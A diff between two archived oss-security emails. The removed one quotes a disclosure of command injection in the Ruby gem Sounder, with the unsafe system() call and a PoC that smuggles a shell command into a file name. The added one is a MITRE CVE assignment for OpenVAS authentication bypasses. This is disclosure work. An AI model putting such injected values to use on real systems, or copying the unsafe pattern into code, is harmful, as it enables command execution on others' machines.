@@ -1,50 +1,63 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/28/8
-Message-ID: <20130828193647.GF31302@kludge.henri.nerv.fi>
-Date: Wed, 28 Aug 2013 22:36:47 +0300
-From: Henri Salo <henri@...v.fi>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/11/10/2
+Message-Id: <201311101233.rAACXe7D015250@linus.mitre.org>
+Date: Sun, 10 Nov 2013 07:33:40 -0500 (EST)
+From: cve-assign@...re.org
 To: oss-security@...ts.openwall.com
-Subject: Re: Command Injection in Ruby Gem Sounder 1.0.1
+Cc: cve-assign@...re.org
+Subject: CVE-2013-6765 CVE-2013-6766 for OpenVAS 4.0.4/1.3.2/etc.
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Aug 28, 2013 at 03:06:14AM +0000, Larry W. Cashdollar wrote:
-> Title: Command Injection in Ruby Gem Sounder 1.0.1
-> 
-> Date: 8/10/2013
-> Author: Larry W. Cashdollar @_larry0
-> 
-> Download: https://rubygems.org/gems/sounder
-> CVE: TBD
-> Description:
-> 
-> Sounder is a ruby gem API for Mac OSX's afplay command.
-> It passes user supplied data directly to command line.
-> 
-> From lib/sounder/sound.rb:
-> 
->    def play
->      system %{/usr/bin/afplay "#{@...e}" &}
->    end
-> 
-> PoC:
-> 
-> irb(main):098:0> @file = "\"id;/usr/bin/id>/tmp/p;\""
-> => "\"id;/usr/bin/id>/tmp/p;\""
-> irb(main):099:0>  system %{/bin/echo "#{@...e}" }
-> id
-> sh: 1: : Permission denied
-> => false
-> irb(main):100:0>
-> 
-> larry@...erfl0w:/tmp$ cat /tmp/p
-> uid=1000(larry) gid=600(staff) groups=600(user)
-> 
-> Author Notified: 8/9/2013
-> Advisory:  http://vapid.dhs.org/advisories/sounder-ruby-gem-cmd-inj.html
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-This was the CVE request (just to be clear).
+> http://lists.wald.intevation.org/pipermail/openvas-announce/2013-November/000157.html
 
----
-Henri Salo
+> For OpenVAS Manager, this is a security release addressing a serious
+> security bug and it is highly recommended to update any installation of
+> OpenVAS Manager 3.0 and 4.0 with the corresponding release.
+> 
+> A software bug in OpenVAS Manager allowed an attacker to bypass the OMP
+> authentication procedure. The attack vector was remotely available in
+> case OpenVAS Manager was listening on a public network interface. In
+> case of successful attack, the attacker gained partial rights to execute
+> OMP commands.  The bypass authentication was, however, incomplete and
+> several OMP commands failed to execute properly.
 
-Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
+Use CVE-2013-6765.
+
+
+> For OpenVAS Administrator, this is a security release addressing a very
+> serious security bug and it is highly recommended to update any
+> installation of OpenVAS Administrator 1.2 and 1.3 with the corresponding
+> release.
+> 
+> A software bug in OpenVAS Administrator allowed an attacker to bypass
+> the OAP authentication procedure. The attack vector was remotely
+> available in case OpenVAS Administrator was listening on a public
+> network interface. In case of successful attack, the attacker was able
+> to create and modify users and could use the gained privileges to take
+> control over an OpenVAS installation if the Scanner and/or Manager
+> instances controlled by this Administrator instance were also listening
+> on public network interfaces.
+
+Use CVE-2013-6766.
+
+Apparently a discloser will provide technical details at a later date.
+
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (SunOS)
+
+iQEcBAEBAgAGBQJSf3zLAAoJEKllVAevmvms5ukH/2N+qMKDquLPObf3uvgBiNu5
+HFD2870eX6efagcpmQHg3hI4rVxNV2B5JfhUewcX2PT3GMmYGpYEbsQU9wS/L0lR
+Fs1XesLvQoZCpiZ99V1t7UyQT10yy4fTgA7PGYKalNMgkPpdZvipJXDhqcFnnzCv
+AFcFggOlFrI0fCZ0tMXPNzxNzNGXPxplMjbU/tTNz/LBCGAcA3ARjUAhzSiWvcV8
+LoVULOqYfxSEHSi1kL0juXJ2AGl1tl0DhZJoqFPLSmrlv+kmCK1cyKkuwlaPqxoi
+/VIRBW+gs3A9dm+BB8ReIb2hQkipM+uY1jsfI9ERofwnud0RgRN5mHZkxOj5W9Y=
+=c9Ja
+-----END PGP SIGNATURE-----
